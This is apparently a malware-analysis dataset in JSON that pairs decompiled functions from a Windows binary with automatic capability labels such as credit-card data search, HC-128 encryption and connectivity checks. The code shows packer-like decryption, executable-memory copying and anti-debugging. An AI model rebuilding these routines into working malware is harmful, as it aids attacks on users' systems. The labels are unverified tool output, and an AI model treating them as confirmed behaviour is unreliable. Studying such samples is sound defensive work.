{
    "0040392e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.0040392e(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t *unaff_ESI;\n    uint32_t uVar3;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x414298;\n    var_10h = *unaff_ESI;\n    uVar3 = unaff_ESI[1];\n    fcn.00403921();\n    iVar2 = *0x4142a0;\n    var_ch = 0x23f;\n    var_24h = 0x20;\n    do {\n        if (*0x43ff2c == 0xfa9) {\n            *0x43fd8c = 0xedeb2e40;\n        }\n        if (*0x43ff2c == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0);\n            *0x43fcf0 = 0;\n        }\n        *0x43fd88 = 0xf4ea3dee;\n        fcn.00403928();\n        if (*0x43ff2c == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_SetCommConfig)(0, 0, 0);\n        }\n        if (*0x43ff2c == 0x213) {\n            (*_sym.imp.KERNEL32.dll_OpenWaitableTimerW)(0, 0, 0);\n        }\n        uVar3 = uVar3 - (var_10h >> 5 ^ var_10h * 0x10 + iVar2 ^ var_10h + var_ch);\n        fcn.0040392b();\n        *0x42b0ec = 0;\n        var_10h = var_10h - (uVar3 * 0x10 + iVar1 ^ var_ch + uVar3 ^ uVar3 >> 5);\n        var_ch = var_ch + 0x61c88647;\n        var_24h = var_24h + -1;\n    } while (var_24h != 0);\n    unaff_ESI[1] = uVar3;\n    *unaff_ESI = var_10h;\n    return;\n}\n",
        "token_count": 587
    },
    "00403aa7": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.00403aa7(void)\n\n{\n    uint32_t uVar1;\n    uint lpDestStr;\n    uint ComputerName;\n    uint lpDCB;\n    uint nSize;\n    \n    for (uVar1 = *0x43ff2c >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        if (*0x43ff2c == 0x959) {\n            (*_sym.imp.KERNEL32.dll_BuildCommDCBW)(0, &lpDCB);\n            (*_sym.imp.KERNEL32.dll_DnsHostnameToComputerNameA)(0, &ComputerName, &nSize);\n            (*_sym.imp.KERNEL32.dll_LCMapStringW)(0, 0, 0, 0, &lpDestStr, 0);\n            (*_sym.imp.KERNEL32.dll_IsBadStringPtrW)(0x402e90, 0);\n        }\n        fcn.0040392e();\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "00403b48": {
        "rules": [
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b",
            "search for credit card data/ac143e9ae29c414184a69c9308e24693"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_d2ch\n\nvoid fcn.00403b48(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_d2ch;\n    uint lpDestStr;\n    uint var_128h;\n    uint lpCPInfo;\n    uint lpConsoleCursorInfo;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpflOldProtect;\n    uint lpNumberOfCharsRead;\n    uint dwReadCoord;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00410468();\n    if (*0x43ff2c == 0x66) {\n        (*_sym.imp.MSIMG32.dll_AlphaBlend)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, *(unaff_EBP + -0x18));\n        (*_sym.imp.WINHTTP.dll_WinHttpCheckPlatform)();\n        fcn.004043ef();\n        *(unaff_EBP + -4) = 0;\n        fcn.004049d1(0);\n        fcn.004049d1(0);\n        fcn.00404859(0);\n        fcn.004038ee(0, 0, 0, 0);\n        fcn.00404d41(0);\n    }\n    *0x43ff2c = *0x43ff2c + 0xb2d3b;\n    *0x43fd80 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x402ec0);\n    *0x43fcf4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *0x43ff2c);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*0x43fcf4, *0x43ff2c, 0x40, unaff_EBP + -0x1c);\n    uVar1 = 0;\n    if (*0x43ff2c != 0) {\n        do {\n            *(*0x43fcf4 + uVar1) = *(*0x43ff30 + 0xb2d3b + uVar1);\n            if (*0x43ff2c == 0x67a) {\n                (*_sym.imp.KERNEL32.dll_HeapAlloc)(0, 0, 0);\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x43ff2c);\n    }\n    iVar2 = 0;\n    do {\n        if (*0x43ff2c + iVar2 == 0x5e) {\n            (*_sym.imp.KERNEL32.dll_CreateFiber)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)(0, unaff_EBP + -0xd2c, 0, 0);\n            (*_sym.imp.KERNEL32.dll_LCMapStringA)(0, 0, 0, 0, unaff_EBP + -0x52c, 0);\n            (*_sym.imp.KERNEL32.dll_GetCPInfo)(0, unaff_EBP + -0x120);\n            (*_sym.imp.KERNEL32.dll_SetNamedPipeHandleState)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_lstrlenA)(0x402edc);\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x40c893);\n    iVar2 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetCommMask)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n        (*_sym.imp.KERNEL32.dll_GetConsoleProcessList)(0, 0);\n        if (iVar2 < 0x26d934) {\n            *(unaff_EBP + -0x38) = 0x127fe718;\n            *(unaff_EBP + -0x44) = 0xe73c505;\n            *(unaff_EBP + -0x20) = 0x2778b6dc;\n            *(unaff_EBP + -0x9c) = 0x85452b6;\n            *(unaff_EBP + -0xb8) = 0x1218ed1d;\n            *(unaff_EBP + -0x104) = 0xd9b6b2;\n            *(unaff_EBP + -0x6c) = 0x60ed2d02;\n            *(unaff_EBP + -0x48) = 0x7c8f244;\n            *(unaff_EBP + -0xd4) = 0x7c68a916;\n            *(unaff_EBP + -0x58) = 0x4024e11b;\n            *(unaff_EBP + -0x94) = 0x31a67be2;\n            *(unaff_EBP + -0x98) = 0x38a010b8;\n            *(unaff_EBP + -0x70) = 0x65cd6bcb;\n            *(unaff_EBP + -100) = 0xd5e2e41;\n            *(unaff_EBP + -0x18) = 0x32b94cf3;\n            *(unaff_EBP + -0xc0) = 0x440dbe79;\n            *(unaff_EBP + -0x30) = 0x7f07bca8;\n            *(unaff_EBP + -0xfc) = 0x2d97c075;\n            *(unaff_EBP + -0x80) = 0x47c6e660;\n            *(unaff_EBP + -0x108) = 0x124d600e;\n            *(unaff_EBP + -0x2c) = 0x7c5bd6b8;\n            *(unaff_EBP + -0x5c) = 0x720f4388;\n            *(unaff_EBP + -0x68) = 0x66f44b2a;\n            *(unaff_EBP + -0x24) = 0x6121e946;\n            *(unaff_EBP + -0x90) = 0x2eb26c41;\n            *(unaff_EBP + -0xd0) = 0x4095ff9e;\n            *(unaff_EBP + -0xe8) = 0x14e054b;\n            *(unaff_EBP + -0x8c) = 0x6069fb2d;\n            *(unaff_EBP + -0x100) = 0x7c2f03fa;\n            *(unaff_EBP + -0xa0) = 0x608f30c7;\n            *(unaff_EBP + -0xac) = 0x7089a0e6;\n            *(unaff_EBP + -0x84) = 0x14fa71ed;\n            *(unaff_EBP + -0x54) = 0x7335f813;\n            *(unaff_EBP + -0x50) = 0x52e1e39b;\n            *(unaff_EBP + -0xc4) = 0xe3b047;\n            *(unaff_EBP + -0x14) = 0x18913c83;\n            *(unaff_EBP + -0xec) = 0x42e1409b;\n            *(unaff_EBP + -0x88) = 0x5e35fc82;\n            *(unaff_EBP + -200) = 0x1e0f0e7;\n            *(unaff_EBP + -0x3c) = 0x5dffc54d;\n            *(unaff_EBP + -0xf0) = 0x4d7a1719;\n            *(unaff_EBP + -0x34) = 0x23eecbd0;\n            *(unaff_EBP + -0x4c) = 0x4ed76024;\n            *(unaff_EBP + -0xd8) = 0x532f8005;\n            *(unaff_EBP + -0xbc) = 0x39a7d51a;\n            *(unaff_EBP + -0xe0) = 0x52a099c1;\n            *(unaff_EBP + -0xe4) = 0x19e73f09;\n            *(unaff_EBP + -0x28) = 0x7fc81313;\n            *(unaff_EBP + -0x74) = 0x4cb0a940;\n            *(unaff_EBP + -0xb0) = 0x53fddb72;\n            *(unaff_EBP + -0x78) = 0x2d4b305d;\n            *(unaff_EBP + -0x7c) = 0x67b61bf8;\n            *(unaff_EBP + -0xf8) = 0x62b90dba;\n            *(unaff_EBP + -0xf4) = 0x158ce4a0;\n            *(unaff_EBP + -0xb4) = 0xb0c24fc;\n            *(unaff_EBP + -0x40) = 0x394c2a2a;\n            *(unaff_EBP + -0xa4) = 0x1a556e59;\n            *(unaff_EBP + -0xa8) = 0x55486f1d;\n            *(unaff_EBP + -0x60) = 0x288b4760;\n            *(unaff_EBP + -0xdc) = 0x7fb3b9be;\n            *(unaff_EBP + -0xcc) = 0x7b3ce4b8;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x30b15d6a;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x1d35e926;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x6e753ef1;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x492f88c5;\n            *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + 0x26664f41;\n            *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + -0x24e4062d;\n            *(unaff_EBP + -0x48) = *(unaff_EBP + -0x48) + 0x52c41bce;\n            *(unaff_EBP + -0x48) = *(unaff_EBP + -0x48) + 0x3ffe67c8;\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -0x258b7ac8;\n            *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + -0x40a681d2;\n            *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + 0x589f5e6b;\n            *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x1b3c9988;\n            *(unaff_EBP + -100) = *(unaff_EBP + -100) + -0x271459e2;\n            *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x6e672dd2;\n            *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x6983ccb2;\n            *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x710e337b;\n            *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -0x610070a5;\n            *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x2f8248e;\n            *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + -0x50d52fcc;\n            *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + 0x3b1f3428;\n            *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x20d2cc78;\n            *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x58f9ea7b;\n            *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + -0x58302607;\n            *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0x56c44812;\n            *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x2c83140d;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x4a3f4800;\n            *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + 0x36525615;\n            *(unaff_EBP + -0x48) = *(unaff_EBP + -0x48) + 0x27eccd5d;\n            *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x169a029a;\n            *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + -0x31943e69;\n            *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 0x310e125d;\n            *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + -0xd2320b3;\n            *(unaff_EBP + -0x50) = *(unaff_EBP + -0x50) + -0x533699d9;\n            *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x6d624fde;\n            *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x7dc19d83;\n            *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + 0x74dcf020;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x642c6016;\n            *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + 0x5f8ad935;\n            *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -0x3ad7f61b;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x210c976e;\n            *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + 0x947f16c;\n            *(unaff_EBP + -0xec) = *(unaff_EBP + -0xec) + 0x667a2a09;\n            *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + 0x4f2af32;\n            *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + -0x1fec65db;\n            *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x6283507;\n            *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 0x6fdc274b;\n            *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + 0x78d847fc;\n        }\n        (*_sym.imp.KERNEL32.dll_GetGeoInfoW)(0, 0, 0, 0, 0);\n    } while ((iVar2 < 0x24229a) && (iVar2 = iVar2 + 1,  iVar2 < 0x15a222dc));\n    fcn.00403aa7();\n    iVar2 = 0;\n    do {\n        if (iVar2 == 0xbde) {\n            fcn.00403b22();\n            iVar2 = extraout_ECX;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x409495);\n    iVar2 = 0x7b;\n    do {\n        if (*0x43ff2c == 0x86) {\n            (*_sym.imp.KERNEL32.dll_AddAtomA)(0x402ef8);\n            (*_sym.imp.ADVAPI32.dll_BackupEventLogA)(0, 0);\n            (*_sym.imp.GDI32.dll_GetCharWidthA)(0, 0, 0, 0);\n        }\n        if (*0x43ff2c == 0xf) {\n            (*_sym.imp.KERNEL32.dll_lstrcmpiW)(0, 0);\n            (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)(0, 0, 0, 0);\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    iVar2 = 0x184d6;\n    do {\n        if (*0x43ff2c == 0x1f) {\n            (*_sym.imp.KERNEL32.dll_SetConsoleCursorInfo)(0, unaff_EBP + -0x10c);\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)(0, 0);\n            *(unaff_EBP + -0x14) = 0;\n            *(unaff_EBP + -0x12) = 0;\n            (*_sym.imp.KERNEL32.dll_ReadConsoleOutputCharacterW)(0, 0, 0, *(unaff_EBP + -0x14), unaff_EBP + -0x18);\n            (*_sym.imp.KERNEL32.dll_GetVolumeNameForVolumeMountPointW)(0, 0, 0);\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402f00);\n    fcn.00403b3c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 4814
    },
    "00404414": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00404414(char param_1)\n\n{\n    int32_t unaff_ESI;\n    \n    if ((param_1 != '\\0') && (0xf < *(unaff_ESI + 0x18))) {\n        fcn.00404469(*(unaff_ESI + 4));\n    }\n    *(unaff_ESI + 0x18) = 0xf;\n    fcn.0040443e();\n    return;\n}\n",
        "token_count": 99
    },
    "00404c15": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00404d08: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00404d0d)\n// WARNING: Removing unreachable block (ram,0x00404d3b)\n// WARNING: Removing unreachable block (ram,0x00404d13)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404c15(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004064c4(0x411470, 0x18);\n    fcn.004059cd(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x42a590 != 1) {\n        *0x42a58c = 1;\n        *0x42a588 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00406972(*0x4400d4);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00406972(*0x4400d0);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00406969();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00406972(*piVar2);\n                        iVar3 = fcn.00406969();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00406972(*0x4400d4);\n                        piVar1 = fcn.00406972(*0x4400d0);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00404b4f(0x4011d4);\n        }\n        fcn.00404b4f(0x4011dc);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004058f3(8);\n    }\n    return;\n}\n",
        "token_count": 799
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404548(uint param_1, uint32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    bool in_ZF;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    unkbyte10 in_ST0;\n    float10 fVar4;\n    uint unaff_retaddr;\n    uint32_t arg_8h;\n    \n    arg_8h = param_2 & 0xffff0000 | in_FPUControlWord;\n    if (in_ZF) {\n        if (((in_EAX & 0xfffff) == 0) && (param_3 == 0)) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = fcn.0040557c();\n        }\n        if (*0x42a5a4 == 0) {\n            uVar3 = fcn.004056f7(arg_8h, unaff_retaddr, param_3, param_4);\n            return CONCAT44(arg_8h, uVar3);\n        }\n    }\n    else {\n        fVar4 = fcos(in_ST0);\n        uVar1 = in_EAX & 0xffff0000 | in_FPUStatusWord;\n        if ((in_FPUStatusWord & 0x400) != 0) {\n            do {\n                fVar4 = fVar4 - (fVar4 / *0x401b5a) * *0x401b5a;\n                uVar1 = uVar1 & 0xffff0000 | in_FPUStatusWord;\n            } while ((in_FPUStatusWord & 0x400) != 0);\n            fcos(fVar4);\n        }\n        if (*0x42a5a4 == 0) {\n            uVar2 = uVar1 & 0xffff0000 | in_FPUControlWord;\n            if (in_FPUControlWord != 0x27f) {\n                if (((in_FPUControlWord & 0x20) != 0) &&\n                   (uVar2 = uVar1 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                    uVar3 = fcn.004056f7(arg_8h, unaff_retaddr, param_3, param_4);\n                    return CONCAT44(arg_8h, uVar3);\n                }\n                uVar2 = uVar2 & 0xffff0020;\n            }\n            return CONCAT44(arg_8h, uVar2);\n        }\n    }\n    return CONCAT44(arg_8h, uVar1);\n}\n",
        "token_count": 610
    },
    "0040705e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040705e(void)\n\n{\n    uint unaff_EBX;\n    uint in_stack_fffffd2c;\n    uint in_stack_fffffd30;\n    uint var_2c8h;\n    \n    fcn.00405300();\n    fcn.004070ea(unaff_EBX, in_stack_fffffd2c, in_stack_fffffd30);\n    return;\n}\n",
        "token_count": 87
    },
    "004099e9": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004099e9(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004058f3(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040a174": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a174(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x413728) {\n        return;\n    }\n    *0x42ade0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x42ade4 = &arg_8h;\n    *0x42ad20 = 0x10001;\n    *0x42acc8 = 0xc0000409;\n    *0x42accc = 1;\n    var_328h = *0x413728;\n    var_324h = *0x41372c;\n    *0x42acd4 = unaff_retaddr;\n    *0x42adac = in_GS;\n    *0x42adb0 = in_FS;\n    *0x42adb4 = in_ES;\n    *0x42adb8 = in_DS;\n    *0x42adbc = unaff_EDI;\n    *0x42adc0 = unaff_ESI;\n    *0x42adc4 = unaff_EBX;\n    *0x42adc8 = in_EDX;\n    *0x42adcc = in_ECX;\n    *0x42add0 = in_EAX;\n    *0x42add4 = unaff_EBP;\n    *0x42add8 = unaff_retaddr;\n    *0x42addc = in_CS;\n    *0x42ade8 = in_SS;\n    *0x42ad18 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040a16c(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4024dc);\n    if (*0x42ad18 == 0) {\n        fcn.0040a16c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 826
    },
    "0040b3ab": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b3ab(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00406969();\n    var_4h = 0;\n    if (*0x42ac74 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40244c);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402440);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x42ac74 = fcn.004068f7(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402430);\n        *0x42ac78 = fcn.004068f7(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x40241c);\n        *0x42ac7c = fcn.004068f7(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402400);\n        *0x42ac84 = fcn.004068f7(uVar3);\n        if (*0x42ac84 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4023e8);\n            *0x42ac80 = fcn.004068f7(uVar3);\n        }\n    }\n    if ((*0x42ac80 != iVar1) && (*0x42ac84 != iVar1)) {\n        pcVar4 = fcn.00406972(*0x42ac80);\n        pcVar5 = fcn.00406972(*0x42ac84);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040b4ed;\n        }\n    }\n    if ((((*0x42ac78 != iVar1) && (pcVar4 = fcn.00406972(*0x42ac78),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n      